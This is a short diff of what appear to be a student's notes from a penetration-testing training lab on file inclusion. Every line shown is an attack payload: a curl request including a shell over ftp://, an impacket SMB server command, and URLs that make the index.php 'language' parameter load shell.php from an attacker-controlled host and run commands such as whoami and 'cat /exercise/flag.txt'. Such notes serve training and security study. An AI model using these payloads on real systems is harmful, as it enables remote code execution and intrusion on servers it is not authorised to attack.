@@ -258,3 +258,5 @@ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/she
 impacket-smbserver -smb2support share $(pwd)
 
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+
+http://10.129.29.114/index.php?language=http://10.10.15.47/shell.php&cmd=cat%20/exercise/flag.txt
